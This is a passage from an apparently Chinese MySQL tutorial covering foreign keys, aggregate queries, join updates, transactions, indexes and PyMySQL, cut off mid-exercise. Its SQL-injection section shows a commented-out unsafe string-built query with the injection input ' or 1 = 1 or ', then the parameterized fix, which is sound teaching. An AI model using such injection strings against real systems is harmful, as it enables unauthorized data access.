classes(id);</code></pre><h4 id="9-3-在创建数据表时设置外键约束"><a href="#9-3-在创建数据表时设置外键约束" class="headerlink" title="9.3 在创建数据表时设置外键约束"></a>9.3 在创建数据表时设置外键约束</h4><pre><code class="sql">-- 创建学校表create table school(    id int not null primary key auto_increment,     name varchar(10));-- 创建老师表create table teacher(    id int not null primary key auto_increment,     name varchar(10),     s_id int not null,     foreign key(s_id) references school(id));</code></pre><h4 id="9-4-删除外键约束"><a href="#9-4-删除外键约束" class="headerlink" title="9.4 删除外键约束"></a>9.4 删除外键约束</h4><pre><code class="sql">-- 需要先获取外键约束名称,该名称系统会自动生成,可以通过查看表创建语句来获取名称show create table teacher;-- 获取名称之后就可以根据名称来删除外键约束alter table teacher drop foreign key 外键名;</code></pre><h3 id="10-演练-分组和聚合函数的组合使用"><a href="#10-演练-分组和聚合函数的组合使用" class="headerlink" title="10.演练-分组和聚合函数的组合使用"></a>10.演练-分组和聚合函数的组合使用</h3><h4 id="10-1-数据准备"><a href="#10-1-数据准备" class="headerlink" title="10.1 数据准备"></a>10.1 数据准备</h4><pre><code class="sql">-- 创建 &quot;京东&quot; 数据库create database jing_dong charset=utf8;-- 使用 &quot;京东&quot; 数据库use jing_dong;-- 创建一个商品goods数据表create table goods(    id int unsigned primary key auto_increment not null,    name varchar(150) not null,    cate_name varchar(40) not null,    brand_name varchar(40) not null,    price decimal(10,3) not null default 0,    is_show bit not null default 1,    is_saleoff bit not null default 0);-- 向goods表中插入数据insert into goods values(0,&#39;r510vc 15.6英寸笔记本&#39;,&#39;笔记本&#39;,&#39;华硕&#39;,&#39;3399&#39;,default,default); insert into goods values(0,&#39;y400n 14.0英寸笔记本电脑&#39;,&#39;笔记本&#39;,&#39;联想&#39;,&#39;4999&#39;,default,default);insert into goods values(0,&#39;g150th 15.6英寸游戏本&#39;,&#39;游戏本&#39;,&#39;雷神&#39;,&#39;8499&#39;,default,default); insert into goods values(0,&#39;x550cc 15.6英寸笔记本&#39;,&#39;笔记本&#39;,&#39;华硕&#39;,&#39;2799&#39;,default,default); insert into goods values(0,&#39;x240 超极本&#39;,&#39;超级本&#39;,&#39;联想&#39;,&#39;4880&#39;,default,default); insert into goods values(0,&#39;u330p 13.3英寸超极本&#39;,&#39;超级本&#39;,&#39;联想&#39;,&#39;4299&#39;,default,default); insert into goods values(0,&#39;svp13226scb 触控超极本&#39;,&#39;超级本&#39;,&#39;索尼&#39;,&#39;7999&#39;,default,default); insert into goods values(0,&#39;ipad mini 7.9英寸平板电脑&#39;,&#39;平板电脑&#39;,&#39;苹果&#39;,&#39;1998&#39;,default,default);insert into goods values(0,&#39;ipad air 9.7英寸平板电脑&#39;,&#39;平板电脑&#39;,&#39;苹果&#39;,&#39;3388&#39;,default,default); insert into goods values(0,&#39;ipad mini 配备 retina 显示屏&#39;,&#39;平板电脑&#39;,&#39;苹果&#39;,&#39;2788&#39;,default,default); insert into goods values(0,&#39;ideacentre c340 20英寸一体电脑 &#39;,&#39;台式机&#39;,&#39;联想&#39;,&#39;3499&#39;,default,default); insert into goods values(0,&#39;vostro 3800-r1206 台式电脑&#39;,&#39;台式机&#39;,&#39;戴尔&#39;,&#39;2899&#39;,default,default); insert into goods values(0,&#39;imac me086ch/a 21.5英寸一体电脑&#39;,&#39;台式机&#39;,&#39;苹果&#39;,&#39;9188&#39;,default,default); insert into goods values(0,&#39;at7-7414lp 台式电脑 linux ）&#39;,&#39;台式机&#39;,&#39;宏碁&#39;,&#39;3699&#39;,default,default); insert into goods values(0,&#39;z220sff f4f06pa工作站&#39;,&#39;服务器/工作站&#39;,&#39;惠普&#39;,&#39;4288&#39;,default,default); insert into goods values(0,&#39;poweredge ii服务器&#39;,&#39;服务器/工作站&#39;,&#39;戴尔&#39;,&#39;5388&#39;,default,default); insert into goods values(0,&#39;mac pro专业级台式电脑&#39;,&#39;服务器/工作站&#39;,&#39;苹果&#39;,&#39;28888&#39;,default,default); insert into goods values(0,&#39;hmz-t3w 头戴显示设备&#39;,&#39;笔记本配件&#39;,&#39;索尼&#39;,&#39;6999&#39;,default,default); insert into goods values(0,&#39;商务双肩背包&#39;,&#39;笔记本配件&#39;,&#39;索尼&#39;,&#39;99&#39;,default,default); insert into goods values(0,&#39;x3250 m4机架式服务器&#39;,&#39;服务器/工作站&#39;,&#39;ibm&#39;,&#39;6888&#39;,default,default); insert into goods values(0,&#39;商务双肩背包&#39;,&#39;笔记本配件&#39;,&#39;索尼&#39;,&#39;99&#39;,default,default);</code></pre><p><strong>表结构说明:</strong></p><ul><li>id 表示主键 自增</li><li>name 表示商品名称</li><li>cate_name 表示分类名称</li><li>brand_name 表示品牌名称</li><li>price 表示价格</li><li>is_show 表示是否显示</li><li>is_saleoff 表示是否售完</li></ul><h4 id="10-2-SQL语句演练"><a href="#10-2-SQL语句演练" class="headerlink" title="10.2 SQL语句演练"></a>10.2 SQL语句演练</h4><ol><li><p>查询类型cate_name为 ‘超级本’ 的商品名称、价格</p><pre><code class="sql"> select name,price from goods where cate_name = &#39;超级本&#39;;</code></pre></li><li><p>显示商品的分类</p><pre><code class="sql"> select cate_name from goods group by cate_name;</code></pre></li><li><p>求所有电脑产品的平均价格,并且保留两位小数</p><pre><code class="sql"> select round(avg(price),2) as avg_price from goods;</code></pre></li><li><p>显示每种商品的平均价格</p><pre><code class="sql"> select cate_name,avg(price) from goods group by cate_name;</code></pre></li><li><p>查询每种类型的商品中 最贵、最便宜、平均价、数量</p><pre><code class="sql"> select cate_name,max(price),min(price),avg(price),count(*)  from goods group by cate_name;</code></pre></li><li><p>查询所有价格大于平均价格的商品，并且按价格降序排序</p><pre><code class="sql"> select id,name,price from goods  where price &gt; (select round(avg(price),2) as avg_price from goods)  order by price desc;</code></pre></li></ol><h2 id="三、MySQL数据库的高级使用"><a href="#三、MySQL数据库的高级使用" class="headerlink" title="三、MySQL数据库的高级使用"></a>三、MySQL数据库的高级使用</h2><h3 id="1-将查询结果插入到其它表中"><a href="#1-将查询结果插入到其它表中" class="headerlink" title="1.将查询结果插入到其它表中"></a>1.将查询结果插入到其它表中</h3><h4 id="1-1-思考"><a href="#1-1-思考" class="headerlink" title="1.1 思考"></a>1.1 思考</h4><p>目前只有一个goods表，我们想要增加一个商品分类信息，比如：移动设备这个分类信息，只通过goods表无法完成商品分类的添加，那么如何实现添加商品分类信息的操作?</p><p><strong>答案:</strong></p><ol><li>创建一个商品分类表，把goods表中的商品分类信息添加到该表中。</li><li>将goods表中的分类名称更改成商品分类表中对应的分类id</li></ol><h4 id="2-2-创建商品分类表"><a href="#2-2-创建商品分类表" class="headerlink" title="2.2 创建商品分类表"></a>2.2 创建商品分类表</h4><pre><code class="sql">-- 创建商品分类表create table good_cates(    id int not null primary key auto_increment,     name varchar(50) not null);</code></pre><h4 id="1-3-把goods表中的商品分类添加到商品分类表"><a href="#1-3-把goods表中的商品分类添加到商品分类表" class="headerlink" title="1.3 把goods表中的商品分类添加到商品分类表"></a>1.3 把goods表中的商品分类添加到商品分类表</h4><pre><code class="sql">-- 查询goods表中商品的分类信息select cate_name from goods group by cate_name;-- 将查询结果插入到good_cates表中insert into good_cates(name) select cate_name from goods group by cate_name;-- 添加移动设备分类信息insert into good_cates(name) values(&#39;移动设备&#39;);</code></pre><p><strong>说明:</strong></p><ul><li>insert into .. select .. 表示: 把查询结果插入到指定表中，也就是表复制。</li></ul><h4 id="1-4-小结"><a href="#1-4-小结" class="headerlink" title="1.4 小结"></a>1.4 小结</h4><ul><li>想要完成表复制可以使用: insert into .. select .. SQL语句</li></ul><h3 id="2-使用连接更新表中某个字段数据"><a href="#2-使用连接更新表中某个字段数据" class="headerlink" title="2.使用连接更新表中某个字段数据"></a>2.使用连接更新表中某个字段数据</h3><h4 id="2-1-更新goods表中的商品分类信息"><a href="#2-1-更新goods表中的商品分类信息" class="headerlink" title="2.1 更新goods表中的商品分类信息"></a>2.1 更新goods表中的商品分类信息</h4><p>上一节课我们已经创建了一个商品分类表(good_cates)，并完成了商品分类信息的插入，现在需要更新goods表中的商品分类信息，把商品分类名称改成商量分类id。</p><p>接下来我们实现第二步操作:</p><ul><li><strong>将goods表中的分类名称更改成商品分类表中对应的分类id</strong></li></ul><pre><code class="sql">-- 查看goods表中的商品分类名称对应的商品分类idselect * from goods inner join good_cates on goods.cate_name = good_cates.name;-- 把该语句中from 后的语句理解为一张虚表  update goods g inner join good_cates gc on g.cate_name=gc.name set g.cate_name=gc.id;</code></pre><h4 id="2-2-小结"><a href="#2-2-小结" class="headerlink" title="2.2 小结"></a>2.2 小结</h4><ul><li>连接更新表中数据使用: update .. join .. 语句</li></ul><h3 id="3-创建表并给某个字段添加数据"><a href="#3-创建表并给某个字段添加数据" class="headerlink" title="3.创建表并给某个字段添加数据"></a>3.创建表并给某个字段添加数据</h3><h4 id="3-1-思考"><a href="#3-1-思考" class="headerlink" title="3.1 思考"></a>3.1 思考</h4><p>前面我们完成了商品分类表(good_cates)的创建和商品分类信息的添加以及把商品表(goods)中的商品分类名称改成了对应的商品分类id，假如我们想要添加一个品牌，比如：双飞燕这个品牌信息，只通过goods表无法完成品牌信息的添加，那么如何实现添加品牌信息的操作?</p><p><strong>答案:</strong></p><ol><li>创建一个品牌表，把goods表中的品牌信息添加到该表中。</li><li>将goods表中的品牌名称更改成品牌表中对应的品牌id</li></ol><h4 id="3-2-创建品牌表"><a href="#3-2-创建品牌表" class="headerlink" title="3.2 创建品牌表"></a>3.2 创建品牌表</h4><pre><code class="sql">-- 查询品牌信息 select brand_name from goods group by brand_name;-- 通过create table ...select来创建数据表并且同时插入数据-- 创建商品分类表，注意: 需要对brand_name 用as起别名，否则name字段就没有值create table good_brands (     id int unsigned primary key auto_increment,     name varchar(40) not null) select brand_name as name from goods group by brand_name;</code></pre><p><strong>说明:</strong></p><ul><li>create table .. select 列名 .. 表示创建表并插入数据</li></ul><h4 id="3-3-更新goods表中的品牌信息"><a href="#3-3-更新goods表中的品牌信息" class="headerlink" title="3.3 更新goods表中的品牌信息"></a>3.3 更新goods表中的品牌信息</h4><pre><code class="sql">-- 将goods表中的品牌名称更改成品牌表中对应的品牌idupdate goods as g inner join good_brands gb on g.brand_name = gb.name set g.brand_name = gb.id;</code></pre><h4 id="3-4-小结"><a href="#3-4-小结" class="headerlink" title="3.4 小结"></a>3.4 小结</h4><ul><li>创建表并给字段插入数据使用: create table .. select 语句</li></ul><h3 id="4-修改goods表结构"><a href="#4-修改goods表结构" class="headerlink" title="4.修改goods表结构"></a>4.修改goods表结构</h3><h4 id="4-1-修改goods表结构"><a href="#4-1-修改goods表结构" class="headerlink" title="4.1 修改goods表结构"></a>4.1 修改goods表结构</h4><p>目前我们已经把good表中的商品分类和品牌信息已经更改成了商品分类id和品牌id，接下来需要把 cate_name 和 brand_name 字段分别改成 cate_id和 brand_id 字段，类型都改成int类型</p><pre><code class="sql">-- 查看表结构desc goods;-- 通过alter table语句修改表结构alter table goods change cate_name cate_id int not null, change brand_name brand_id int not null;</code></pre><p><strong>说明:</strong></p><ul><li>alert table 可以同时修改多个字段信息</li></ul><h4 id="4-2-小结"><a href="#4-2-小结" class="headerlink" title="4.2 小结"></a>4.2 小结</h4><ul><li>修改表结构可以使用: alter table 语句，多个修改字段之间使用逗号分隔</li></ul><h3 id="5-事务"><a href="#5-事务" class="headerlink" title="5.事务"></a>5.事务</h3><h4 id="5-1-事务的介绍"><a href="#5-1-事务的介绍" class="headerlink" title="5.1 事务的介绍"></a>5.1 事务的介绍</h4><p>事务就是用户定义的一系列执行SQL语句的操作, 这些操作要么完全地执行，要么完全地都不执行， 它是一个不可分割的工作执行单元。</p><p><strong>事务的使用场景:</strong></p><p>在日常生活中，有时我们需要进行银行转账，这个银行转账操作背后就是需要执行多个SQL语句，假如这些SQL执行到一半突然停电了，那么就会导致这个功能只完成了一半，这种情况是不允许出现，要想解决这个问题就需要通过事务来完成。</p><h4 id="5-2-事务的四大特性"><a href="#5-2-事务的四大特性" class="headerlink" title="5.2 事务的四大特性"></a>5.2 事务的四大特性</h4><ul><li>原子性(Atomicity)</li><li>一致性(Consistency)</li><li>隔离性(Isolation)</li><li>持久性(Durability)</li></ul><p><strong>原子性:</strong></p><p>一个事务必须被视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，对于一个事务来说，不可能只执行其中的一部分操作，这就是事务的原子性</p><p><strong>一致性:</strong></p><p>数据库总是从一个一致性的状态转换到另一个一致性的状态。（在前面的例子中，一致性确保了，即使在转账过程中系统崩溃，支票账户中也不会损失200美元，因为事务最终没有提交，所以事务中所做的修改也不会保存到数据库中。）</p><p><strong>隔离性:</strong></p><p>通常来说，一个事务所做的修改操作在提交事务之前，对于其他事务来说是不可见的。（在前面的例子中，当执行完第三条语句、第四条语句还未开始时，此时有另外的一个账户汇总程序开始运行，则其看到支票帐户的余额并没有被减去200美元。）</p><p><strong>持久性:</strong></p><p>一旦事务提交，则其所做的修改会永久保存到数据库。</p><p><strong>说明:</strong></p><p>事务能够保证数据的完整性和一致性，让用户的操作更加安全。</p><h4 id="5-3-事务的使用"><a href="#5-3-事务的使用" class="headerlink" title="5.3 事务的使用"></a>5.3 事务的使用</h4><p>在使用事务之前，先要确保表的存储引擎是 InnoDB 类型, 只有这个类型才可以使用事务，MySQL数据库中表的存储引擎默认是 InnoDB 类型。</p><p><strong>表的存储引擎说明:</strong></p><p>表的存储引擎就是提供存储数据一种机制，不同表的存储引擎提供不同的存储机制。</p><pre><code class="sql">-- 查看MySQL数据库支持的表的存储引擎show engines;</code></pre><p><strong>说明:</strong></p><ul><li>常用的表的存储引擎是 InnoDB 和 MyISAM</li><li>InnoDB 是支持事务的</li><li>MyISAM 不支持事务，优势是访问速度快，对事务没有要求或者以select、insert为主的都可以使用该存储引擎来创建表</li></ul><p><strong>查看goods表的创表语句:</strong></p><pre><code class="sql">-- 选择数据库use jing_dong;-- 查看goods表show create table goods;mysql root@(none):jing_dong&gt; show create table goods;+-------+--------------------------------------------------------+| Table | Create Table                                           |+-------+--------------------------------------------------------+| goods | CREATE TABLE `goods` (                                 ||       |   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,       ||       |   `name` varchar(150) NOT NULL,                        ||       |   `cate_id` int(10) unsigned NOT NULL,                 ||       |   `brand_id` int(10) unsigned NOT NULL,                ||       |   `price` decimal(10,3) NOT NULL DEFAULT &#39;0.000&#39;,      ||       |   `is_show` bit(1) NOT NULL DEFAULT b&#39;1&#39;,              ||       |   `is_saleoff` bit(1) NOT NULL DEFAULT b&#39;0&#39;,           ||       |   PRIMARY KEY (`id`)                                   ||       | ) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8 |+-------+--------------------------------------------------------+</code></pre><p><strong>说明:</strong></p><ul><li>通过创表语句可以得知，goods表的存储引擎是InnoDB。</li><li>修改表的存储引擎使用: alter table 表名 engine = 引擎类型;<ul><li>比如: alter table students engine = ‘MyISAM’;</li></ul></li></ul><p><strong>开启事务:</strong></p><pre><code class="sql">begin;或者start transaction;</code></pre><p><strong>说明:</strong></p><ul><li><p><strong>开启事务后执行修改命令，变更数据会保存到MySQL服务端的缓存文件中，而不维护到物理表中</strong></p></li><li><p><strong>MySQL数据库默认采用自动提交(autocommit)模式，如果没有显示的开启一个事务,那么每条sql语句都会被当作一个事务执行提交的操作</strong></p></li><li><p>当设置autocommit=0就是取消了自动提交事务模式，直到显示的执行commit和rollback表示该事务结束。</p><ul><li>set autocommit = 0 表示取消自动提交事务模式，需要手动执行commit完成事务的提交</li></ul><pre><code class="sql">set autocommit = 0;insert into students(name) values(&#39;刘三峰&#39;);-- 需要执行手动提交，数据才会真正添加到表中, 验证的话需要重新打开一个连接窗口查看表的数据信息，因为是临时关闭自动提交模式commit-- 重新打开一个终端窗口，连接MySQL数据库服务端mysql -uroot -p-- 然后查询数据,如果上个窗口执行了commit，这个窗口才能看到数据select * from students;</code></pre><p><strong>提交事务:</strong></p><p>将本地缓存文件中的数据提交到物理表中，完成数据的更新。</p><pre><code class="sql">commit;</code></pre><p><strong>回滚事务:</strong></p><p>放弃本地缓存文件中的缓存数据, 表示回到开始事务前的状态</p><pre><code>rollback;</code></pre><p><strong>事务演练的SQL语句:</strong></p><pre><code class="sql">begin;insert into students(name) values(&#39;李白&#39;);-- 查询数据，此时有新增的数据, 注意: 如果这里后续没有执行提交事务操作，那么数据是没有真正的更新到物理表中select * from students;-- 只有这里提交事务，才把数据真正插入到物理表中commit;-- 新打开一个终端，重新连接MySQL数据库，查询students表,这时没有显示新增的数据，说明之前的事务没有提交，这就是事务的隔离性-- 一个事务所做的修改操作在提交事务之前，对于其他事务来说是不可见的select * from students;</code></pre></li></ul><h4 id="5-4-小结"><a href="#5-4-小结" class="headerlink" title="5.4 小结"></a>5.4 小结</h4><ol><li>事务的特性:<ul><li>原子性: 强调事务中的多个操作时一个整体</li><li>一致性: 强调数据库中不会保存不一致状态</li><li>隔离性: 强调数据库中事务之间相互不可见</li><li>持久性: 强调数据库能永久保存数据，一旦提交就不可撤销</li></ul></li><li><strong>MySQL数据库默认采用自动提交(autocommit)模式</strong>, 也就是说修改数据(insert、update、delete)的操作会自动的触发事务,完成事务的提交或者回滚</li><li>开启事务使用 begin 或者 start transaction;</li><li>回滚事务使用 rollback;</li><li>pymysql 里面的 conn.commit() 操作就是提交事务</li><li>pymysql 里面的 conn.rollback() 操作就是回滚事务</li></ol><h3 id="6-索引"><a href="#6-索引" class="headerlink" title="6.索引"></a>6.索引</h3><h4 id="6-1-索引的介绍"><a href="#6-1-索引的介绍" class="headerlink" title="6.1 索引的介绍"></a>6.1 索引的介绍</h4><p>索引在MySQL中也叫做“键”，它是一个特殊的文件，它保存着数据表里所有记录的位置信息，更通俗的来说，数据库索引好比是一本书前面的目录，能加快数据库的查询速度。</p><p><strong>应用场景:</strong></p><p>当数据库中数据量很大时，查找数据会变得很慢，我们就可以通过索引来提高数据库的查询效率。</p><h4 id="6-2-索引的使用"><a href="#6-2-索引的使用" class="headerlink" title="6.2 索引的使用"></a>6.2 索引的使用</h4><p><strong>查看表中已有索引:</strong></p><pre><code class="sql">show index from 表名;</code></pre><p><strong>说明:</strong></p><ul><li>主键列会自动创建索引</li></ul><p><strong>索引的创建:</strong></p><pre><code class="sql">-- 创建索引的语法格式-- alter table 表名 add index 索引名[可选](列名, ..)-- 给name字段添加索引alter table classes add index my_name (name);</code></pre><p><strong>说明:</strong></p><ul><li>索引名不指定，默认使用字段名</li></ul><p><strong>索引的删除:</strong></p><pre><code class="sql">-- 删除索引的语法格式-- alter table 表名 drop index 索引名-- 如果不知道索引名，可以查看创表sql语句show create table classes;alter table classes drop index my_name;</code></pre><h4 id="6-3-案例-验证索引查询性能"><a href="#6-3-案例-验证索引查询性能" class="headerlink" title="6.3 案例-验证索引查询性能"></a>6.3 案例-验证索引查询性能</h4><p><strong>创建测试表testindex:</strong></p><pre><code class="sql">create table test_index(title varchar(10));</code></pre><p><strong>向表中插入十万条数据:</strong></p><pre><code class="py">from pymysql import connectdef main():    # 创建Connection连接    conn = connect(host=&#39;localhost&#39;,port=3306,database=&#39;python&#39;,user=&#39;root&#39;,password=&#39;mysql&#39;,charset=&#39;utf8&#39;)    # 获得Cursor对象    cursor = conn.cursor()    # 插入10万次数据    for i in range(100000):        cursor.execute(&quot;insert into test_index values(&#39;ha-%d&#39;)&quot; % i)    # 提交数据    conn.commit()if __name__ == &quot;__main__&quot;:    main()</code></pre><p><strong>验证索引性能操作：</strong></p><pre><code class="sql">-- 开启运行时间监测：set profiling=1;-- 查找第1万条数据ha-99999select * from test_index where title=&#39;ha-99999&#39;;-- 查看执行的时间：show profiles;-- 给title字段创建索引：alter table test_index add index (title);-- 再次执行查询语句select * from test_index where title=&#39;ha-99999&#39;;-- 再次查看执行的时间show profiles;</code></pre><h4 id="6-4-联合索引"><a href="#6-4-联合索引" class="headerlink" title="6.4 联合索引"></a>6.4 联合索引</h4><p>联合索引又叫复合索引，即一个索引覆盖表中两个或者多个字段，一般用在多个字段一起查询的时候。</p><pre><code class="sql">-- 创建teacher表create table teacher(    id int not null primary key auto_increment,    name varchar(10),    age int);-- 创建联合索引alter table teacher add index (name,age);</code></pre><p><strong>联合索引的好处:</strong></p><ul><li>减少磁盘空间开销，因为每创建一个索引，其实就是创建了一个索引文件，那么会增加磁盘空间的开销。</li></ul><h4 id="6-5-联合索引的最左原则"><a href="#6-5-联合索引的最左原则" class="headerlink" title="6.5 联合索引的最左原则"></a>6.5 联合索引的最左原则</h4><p>在使用联合索引的时候，我们要遵守一个最左原则,即index(name,age)支持 name 、name 和 age 组合查询,而不支持单独 age 查询，因为没有用到创建的联合索引。</p><p><strong>最左原则示例:</strong></p><pre><code class="sql">-- 下面的查询使用到了联合索引select * from stu where name=&#39;张三&#39; -- 这里使用了联合索引的name部分select * from stu where name=&#39;李四&#39; and age=10 -- 这里完整的使用联合索引，包括 name 和 age 部分 -- 下面的查询没有使用到联合索引select * from stu where age=10 -- 因为联合索引里面没有这个组合，只有 name | name age 这两种组合</code></pre><p><strong>说明:</strong></p><ul><li>在使用联合索引的查询数据时候一定要保证联合索引的最左侧字段出现在查询条件里面，否则联合索引失效</li></ul><h4 id="6-6-MySQL中索引的优点和缺点和使用原则"><a href="#6-6-MySQL中索引的优点和缺点和使用原则" class="headerlink" title="6.6 MySQL中索引的优点和缺点和使用原则"></a>6.6 MySQL中索引的优点和缺点和使用原则</h4><ul><li>优点：<ol><li>加快数据的查询速度</li></ol></li><li>缺点：<ol><li>创建索引会耗费时间和占用磁盘空间，并且随着数据量的增加所耗费的时间也会增加</li></ol></li><li>使用原则：<ol><li>通过优缺点对比，不是索引越多越好，而是需要自己合理的使用。</li><li>对经常更新的表就避免对其进行过多索引的创建，对经常用于查询的字段应该创建索引，</li><li>数据量小的表最好不要使用索引，因为由于数据较少，可能查询全部数据花费的时间比遍历索引的时间还要短，索引就可能不会产生优化效果。</li><li>在一字段上相同值比较多不要建立索引，比如在学生表的”性别”字段上只有男，女两个不同值。相反的，在一个字段上不同值较多可是建立索引。</li></ol></li></ul><h4 id="6-7-小结"><a href="#6-7-小结" class="headerlink" title="6.7 小结"></a>6.7 小结</h4><ul><li>索引是加快数据库的查询速度的一种手段</li><li>创建索引使用: alter table 表名 add index 索引名[可选] (字段名, xxx);</li><li>删除索引使用: alter table 表名 drop index 索引名;</li></ul><h3 id="7-PyMySQL的使用"><a href="#7-PyMySQL的使用" class="headerlink" title="7.PyMySQL的使用"></a>7.PyMySQL的使用</h3><h4 id="7-1-思考"><a href="#7-1-思考" class="headerlink" title="7.1 思考"></a>7.1 思考</h4><p>如何实现将100000条数据插入到MySQL数据库?</p><p><strong>答案:</strong></p><p>如果使用之前学习的MySQL客户端来完成这个操作，那么这个工作量无疑是巨大的，我们可以通过使用程序代码的方式去连接MySQL数据库，然后对MySQL数据库进行增删改查的方式，实现10000条数据的插入，像这样使用代码的方式操作数据库就称为数据库编程。</p><h4 id="7-2-Python程序操作MySQL数据库"><a href="#7-2-Python程序操作MySQL数据库" class="headerlink" title="7.2 Python程序操作MySQL数据库"></a>7.2 Python程序操作MySQL数据库</h4><p><strong>安装pymysql第三方包:</strong></p><pre><code class="bash">sudo pip3 install pymysql</code></pre><p><strong>说明:</strong></p><ul><li>安装命令使用 sudo pip3 install 第三方包名</li><li>卸载命令使用 sudo pip3 uninstall 第三方包</li><li>大家现在使用的虚拟机已经安装了这个第三方包，可以使用： <strong>pip3 show pymysql</strong> 命令查看第三方包的信息</li><li><strong>pip3 list</strong> 查看使用pip命令安装的第三方包列表</li></ul><p><strong>pymysql的使用:</strong></p><ol><li><p>导入 pymysql 包</p><pre><code class="python"> import pymysql</code></pre></li><li><p>创建连接对象</p><p>调用pymysql模块中的connect()函数来创建连接对象,代码如下:</p><pre><code class="py"> conn=connect(参数列表) * 参数host：连接的mysql主机，如果本机是&#39;localhost&#39; * 参数port：连接的mysql主机的端口，默认是3306 * 参数user：连接的用户名 * 参数password：连接的密码 * 参数database：数据库的名称 * 参数charset：通信采用的编码方式，推荐使用utf8</code></pre><p><strong>连接对象操作说明:</strong></p><ul><li>关闭连接 conn.close()</li><li>提交数据 conn.commit()</li><li>撤销数据 conn.rollback()</li></ul></li><li><p>获取游标对象</p><p>获取游标对象的目标就是要执行sql语句，完成对数据库的增、删、改、查操作。代码如下:</p><pre><code class="py"> # 调用连接对象的cursor()方法获取游标对象    cur =conn.cursor()</code></pre><p><strong>游标操作说明:</strong></p><ul><li>使用游标执行SQL语句: execute(operation [parameters ]) 执行SQL语句，返回受影响的行数，主要用于执行insert、update、delete、select等语句</li><li>获取查询结果集中的一条数据:cur.fetchone()返回一个元组, 如 (1,’张三’)</li><li>获取查询结果集中的所有数据: cur.fetchall()返回一个元组,如((1,’张三’),(2,’李四’))</li><li>关闭游标: cur.close(),表示和数据库操作完成</li></ul></li><li><p>pymysql完成数据的查询操作</p><pre><code class="python">import pymysql# 创建连接对象conn = pymysql.connect(host=&#39;localhost&#39;, port=3306, user=&#39;root&#39;, password=&#39;mysql&#39;,database=&#39;python&#39;, charset=&#39;utf8&#39;)# 获取游标对象cursor = conn.cursor()# 查询 SQL 语句sql = &quot;select * from students;&quot;# 执行 SQL 语句 返回值就是 SQL 语句在执行过程中影响的行数row_count = cursor.execute(sql)print(&quot;SQL 语句执行影响的行数%d&quot; % row_count)# 取出结果集中一行数据,　例如:(1, &#39;张三&#39;)# print(cursor.fetchone())# 取出结果集中的所有数据, 例如:((1, &#39;张三&#39;), (2, &#39;李四&#39;), (3, &#39;王五&#39;))for line in cursor.fetchall():    print(line)# 关闭游标cursor.close()# 关闭连接conn.close()</code></pre></li><li><p>pymysql完成对数据的增删改</p><pre><code class="python">import pymysql# 创建连接对象conn = pymysql.connect(host=&#39;localhost&#39;, port=3306, user=&#39;root&#39;, password=&#39;mysql&#39;,database=&#39;python&#39;, charset=&#39;utf8&#39;)# 获取游标对象cursor = conn.cursor()try:    # 添加 SQL 语句    # sql = &quot;insert into students(name) values(&#39;刘璐&#39;), (&#39;王美丽&#39;);&quot;    # 删除 SQ L语句    # sql = &quot;delete from students where id = 5;&quot;    # 修改 SQL 语句    sql = &quot;update students set name = &#39;王铁蛋&#39; where id = 6;&quot;    # 执行 SQL 语句    row_count = cursor.execute(sql)    print(&quot;SQL 语句执行影响的行数%d&quot; % row_count)    # 提交数据到数据库    conn.commit()except Exception as e:    # 回滚数据， 即撤销刚刚的SQL语句操作    conn.rollback()# 关闭游标cursor.close()# 关闭连接conn.close()</code></pre><p><strong>说明:</strong></p><ul><li>conn.commit() 表示将修改操作提交到数据库</li><li>conn.rollback() 表示回滚数据</li></ul></li><li><p>防止SQL注入</p><p>什么是SQL注入?</p><p>用户提交带有恶意的数据与SQL语句进行字符串方式的拼接，从而影响了SQL语句的语义，最终产生数据泄露的现象。</p><p>如何防止SQL注入?</p><p>SQL语句参数化</p><ul><li>SQL语言中的参数使用%s来占位，此处不是python中的字符串格式化操作</li><li>将SQL语句中%s占位所需要的参数存在一个列表中，把参数列表传递给execute方法中第二个参数</li></ul><p><strong>防止SQL注入的示例代码:</strong></p><pre><code class="python">from pymysql import connectdef main():    find_name = input(&quot;请输入物品名称：&quot;)    # 创建Connection连接    conn = connect(host=&#39;localhost&#39;,port=3306,user=&#39;root&#39;,password=&#39;mysql&#39;,database=&#39;jing_dong&#39;,charset=&#39;utf8&#39;)    # 获得Cursor对象    cs1 = conn.cursor()    # 非安全的方式    # 输入 &#39; or 1 = 1 or &#39;   (单引号也要输入)    # sql = &quot;select * from goods where name=&#39;%s&#39;&quot; % find_name    # print(&quot;&quot;&quot;sql===&gt;%s&lt;====&quot;&quot;&quot; % sql)    # # 执行select语句，并返回受影响的行数：查询所有数据    # count = cs1.execute(sql)    # 安全的方式    # 构造参数列表    params = [find_name]    # 执行select语句，并返回受影响的行数：查询所有数据    count = cs1.execute(&quot;select * from goods where name=%s&quot;, params)    # 注意：    # 如果要是有多个参数，需要进行参数化    # 那么params = [数值1, 数值2....]，此时sql语句中有多个%s即可    # %s 不需要带引号    # 打印受影响的行数    print(count)    # 获取查询的结果    # result = cs1.fetchone()    result = cs1.fetchall()    # 打印查询的结果    print(result)    # 关闭Cursor对象    cs1.close()    # 关闭Connection对象    conn.close()if __name__ == &#39;__main__&#39;:    main()</code></pre><p><strong>说明:</strong></p><ul><li>execute方法中的 %s 占位不需要带引号</li></ul></li></ol><h4 id="7-3-小结-1"><a href="#7-3-小结-1" class="headerlink" title="7.3 小结"></a>7.3 小结</h4><ol><li><p>导包</p><pre><code class="py"> import pymysql</code></pre></li><li><p>创建连接对象</p><pre><code class="py"> pymysql.connect(参数列表)</code></pre></li><li><p>获取游标对象</p><pre><code class="py"> cursor =conn.cursor()</code></pre></li><li><p>执行SQL语句</p><pre><code class="py"> row_count = cursor.execute(sql)</code></pre></li><li><p>获取查询结果集</p><pre><code class="py"> result = cursor.fetchall()</code></pre></li><li><p>将修改操作提交到数据库</p><pre><code class="py"> conn.commit()</code></pre></li><li><p>回滚数据</p><pre><code class="py"> conn.rollback()</code></pre></li><li><p>关闭游标</p><pre><code class="py"> cursor.close()</code></pre></li><li><p>关闭连接</p><pre><code class="py"> conn.close()</code></pre></li></ol><h3 id="8-京东数据库案例练习"><a href="#8-京东数据库案例练习" class="headerlink" title="8.京东数据库案例练习"></a>8.京东数据库案例练习</h3><p>一. 准备数据</p><p>该案例使用前面章节中完成的京东商品数据库.</p><p>二. 程序菜单</p><pre><code class="python">    print(&#39;1. 查询所有商品信息&#39;)    print(&quot;2. 查询所有包含商品的分类&quot;)    print(&quot;3. 添加新商品分类&quot;)    print(&quot;4. 将所有商品价格加1000&quot;)    print(&quot;5. 